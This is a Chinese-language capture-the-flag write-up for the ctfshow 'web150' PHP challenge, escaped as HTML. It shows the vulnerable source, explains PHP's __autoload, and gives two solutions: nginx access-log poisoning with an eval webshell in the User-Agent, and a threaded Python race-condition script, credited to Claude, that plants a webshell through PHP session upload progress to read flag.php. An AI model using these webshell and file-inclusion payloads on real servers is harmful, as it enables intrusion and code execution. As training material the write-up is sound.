&lt;h1 id=&#34;web150&#34;&gt;&lt;a href=&#34;#web150&#34; class=&#34;headerlink&#34; title=&#34;web150&#34;&gt;&lt;/a&gt;web150&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-19 07:12:57

*/
include(&amp;quot;flag.php&amp;quot;);
error_reporting(0);
highlight_file(__FILE__);

class CTFSHOW&amp;#123;
    private $username;
    private $password;
    private $vip;
    private $secret;

    function __construct()&amp;#123;
        $this-&amp;gt;vip = 0;
        $this-&amp;gt;secret = $flag;
    &amp;#125;

    function __destruct()&amp;#123;
        echo $this-&amp;gt;secret;
    &amp;#125;

    public function isVIP()&amp;#123;
        return $this-&amp;gt;vip?TRUE:FALSE;
        &amp;#125;
    &amp;#125;

    function __autoload($class)&amp;#123;
        if(isset($class))&amp;#123;
            $class();
    &amp;#125;
&amp;#125;

#过滤字符
$key = $_SERVER[&amp;#39;QUERY_STRING&amp;#39;];
if(preg_match(&amp;#39;/\_| |\[|\]|\?/&amp;#39;, $key))&amp;#123;
    die(&amp;quot;error&amp;quot;);
&amp;#125;
$ctf = $_POST[&amp;#39;ctf&amp;#39;];
extract($_GET);
if(class_exists($__CTFSHOW__))&amp;#123;
    echo &amp;quot;class is exists!&amp;quot;;
&amp;#125;

if($isVIP &amp;amp;&amp;amp; strrpos($ctf, &amp;quot;:&amp;quot;)===FALSE)&amp;#123;
    include($ctf);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;===&lt;/code&gt; 优先级高于 &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;__autoload()&lt;/code&gt; 函数&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. 基本概念&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;__autoload&lt;/code&gt; 是 PHP 的一个 &lt;strong&gt;魔术函数&lt;/strong&gt;，用于 &lt;strong&gt;类自动加载&lt;/strong&gt;。它的作用是：当你实例化一个类，而 PHP 发现这个类还没有被定义时，会自动调用 &lt;code&gt;__autoload&lt;/code&gt;，由你在函数里定义如何加载对应类文件。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;函数签名：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;function __autoload(string $className) &amp;#123;
    // 加载类文件逻辑
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;$className&lt;/code&gt;：PHP 试图实例化的类名。&lt;/li&gt;
&lt;li&gt;你在函数里通常会 include 或 require 该类对应的文件。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;2. 基本示例&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;假设有一个类 &lt;code&gt;User&lt;/code&gt;，存放在 &lt;code&gt;User.php&lt;/code&gt; 文件中：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;// User.php
class User &amp;#123;
    public function sayHi() &amp;#123;
        echo &amp;quot;Hi!&amp;quot;;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后使用 &lt;code&gt;__autoload&lt;/code&gt; 自动加载：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
function __autoload($className) &amp;#123;
    include $className . &amp;#39;.php&amp;#39;;
&amp;#125;

$user = new User();
$user-&amp;gt;sayHi();
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;流程说明：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;PHP 遇到 &lt;code&gt;new User()&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;检查是否已经定义 &lt;code&gt;User&lt;/code&gt; 类。&lt;/li&gt;
&lt;li&gt;如果没有，自动调用 &lt;code&gt;__autoload(&amp;#39;User&amp;#39;)&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__autoload&lt;/code&gt; 里 include &lt;code&gt;User.php&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;类被加载，然后实例化成功。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?isVIP=1

User-Agent
&amp;lt;?php @eval($_POST[a]);?&amp;gt;

ctf=/var/log/nginx/access.log&amp;amp;a=system(&amp;quot;ls&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250818003759234.png&#34; alt=&#34;image-20250818003759234&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?isVIP=1

User-Agent
&amp;lt;?php @eval($_POST[a]);?&amp;gt;

ctf=/var/log/nginx/access.log&amp;amp;a=system(&amp;quot;tac flag.php&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250818003930153.png&#34; alt=&#34;image-20250818003930153&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用竞争脚本&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上传恶意 PHP 代码&lt;/strong&gt;：通过 &lt;code&gt;PHP_SESSION_UPLOAD_PROGRESS&lt;/code&gt; 伪造上传文件，把 &lt;code&gt;&amp;lt;?php eval($_POST[&amp;quot;cmd&amp;quot;]);?&amp;gt;&lt;/code&gt; 写入服务器的会话文件 &lt;code&gt;/tmp/sess_test&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;触发执行&lt;/strong&gt;：通过 &lt;code&gt;isVIP=1&lt;/code&gt; 的 POST 请求，把 &lt;code&gt;data[&amp;#39;cmd&amp;#39;]&lt;/code&gt; 内容（&lt;code&gt;system(&amp;quot;cat flag.php&amp;quot;)&lt;/code&gt;）发送到已经写入的 session 文件，从而执行 &lt;code&gt;cat flag.php&lt;/code&gt; 并读取 flag。&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250818011229912.png&#34; alt=&#34;image-20250818011229912&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&lt;strong&gt;竞争脚本 from Claude（可能需要多跑几次）&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import io
import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor
import sys

class CTFExploit:
    def __init__(self):
        self.sessid = &amp;#39;test&amp;#39;
        self.base_url = &amp;#39;http://b962aff3-e9b9-4d5a-b650-4536947b6461.challenge.ctf.show/&amp;#39;
        self.data = &amp;#123;
            &amp;quot;ctf&amp;quot;: &amp;quot;/tmp/sess_test&amp;quot;,
            &amp;quot;cmd&amp;quot;: &amp;#39;system(&amp;quot;cat flag.php&amp;quot;);&amp;#39;
        &amp;#125;
        self.found_flag = False
        self.session = requests.Session()

    def write_session(self):
        &amp;quot;&amp;quot;&amp;quot;写入session文件&amp;quot;&amp;quot;&amp;quot;
        try:
            f = io.BytesIO(b&amp;#39;a&amp;#39; * 1024 * 30)  # 减少文件大小提高速度
            self.session.post(
                self.base_url,
                data=&amp;#123;&amp;#39;PHP_SESSION_UPLOAD_PROGRESS&amp;#39;: &amp;#39;&amp;lt;?php eval($_POST[&amp;quot;cmd&amp;quot;]);?&amp;gt;&amp;#39;&amp;#125;,
                files=&amp;#123;&amp;#39;file&amp;#39;: (&amp;#39;test.txt&amp;#39;, f)&amp;#125;, 
                cookies=&amp;#123;&amp;#39;PHPSESSID&amp;#39;: self.sessid&amp;#125;,
                timeout=5  # 添加超时
            )
        except:
            pass

    def read_flag(self):
        &amp;quot;&amp;quot;&amp;quot;尝试读取flag&amp;quot;&amp;quot;&amp;quot;
        try:
            res = self.session.post(
                f&amp;#39;&amp;#123;self.base_url&amp;#125;?isVIP=1&amp;#39;,
                data=self.data,
                timeout=5  # 添加超时
            )
            if &amp;#39;ctfshow&amp;#123;&amp;#39; in res.text:
                print(f&amp;quot;[+] Flag found: &amp;#123;res.text&amp;#125;&amp;quot;)
                self.found_flag = True
                return True
        except:
            pass
        return False

    def exploit(self):
        &amp;quot;&amp;quot;&amp;quot;主要攻击逻辑&amp;quot;&amp;quot;&amp;quot;
        print(&amp;quot;[*] Starting exploit...&amp;quot;)

        with ThreadPoolExecutor(max_workers=8) as executor:
            # 启动写入线程
            write_futures = []
            for _ in range(3):  # 减少写入线程数
                write_futures.append(executor.submit(self.continuous_write))

            # 启动读取线程
            read_futures = []
            for _ in range(5):  # 增加读取线程数，提高命中率
                read_futures.append(executor.submit(self.continuous_read))

            # 等待结果
            start_time = time.time()
            while not self.found_flag and (time.time() - start_time) &amp;lt; 30:  # 30秒超时
                time.sleep(0.1)

            if self.found_flag:
                print(&amp;quot;[+] Exploit successful!&amp;quot;)
            else:
                print(&amp;quot;[-] Exploit failed or timeout&amp;quot;)

            # 清理线程
            self.found_flag = True  # 停止所有线程

    def continuous_write(self):
        &amp;quot;&amp;quot;&amp;quot;持续写入session&amp;quot;&amp;quot;&amp;quot;
        while not self.found_flag:
            self.write_session()
            time.sleep(0.01)  # 短暂延迟避免过于频繁

    def continuous_read(self):
        &amp;quot;&amp;quot;&amp;quot;持续尝试读取&amp;quot;&amp;quot;&amp;quot;
        retry_count = 0
        while not self.found_flag and retry_count &amp;lt; 100:  # 限制重试次数
            if self.read_flag():
                break
            retry_count += 1
            if retry_count % 10 == 0:  # 每10次输出一次进度
                print(f&amp;#39;[*] Tried &amp;#123;retry_count&amp;#125; times...&amp;#39;)
            time.sleep(0.05)  # 增加读取间隔，减少无效请求

    def quick_exploit(self):
        &amp;quot;&amp;quot;&amp;quot;快速版本 - 更激进的并发策略&amp;quot;&amp;quot;&amp;quot;
        print(&amp;quot;[*] Starting quick exploit...&amp;quot;)

        # 预热 - 先写入几次session
        for _ in range(3):
            self.write_session()

        with ThreadPoolExecutor(max_workers=12) as executor:
            # 交替写入和读取
            futures = []
            for i in range(50):  # 限制总尝试次数
                if i % 3 == 0:  # 每3次读取前先写入一次
                    futures.append(executor.submit(self.write_session))
                futures.append(executor.submit(self.read_flag))

                if self.found_flag:
                    break

            # 等待部分完成即可
            for future in futures:
                if self.found_flag:
                    break
                try:
                    future.result(timeout=1)
                except:
                    continue

if __name__ == &amp;quot;__main__&amp;quot;:
    exploit = CTFExploit()

    # 尝试快速版本
    exploit.quick_exploit()

    # 如果快速版本失败，使用标准版本
    if not exploit.found_flag:
        print(&amp;quot;[*] Quick exploit failed, trying standard method...&amp;quot;)
        exploit.found_flag = False  # 重置标志
        exploit.exploit()
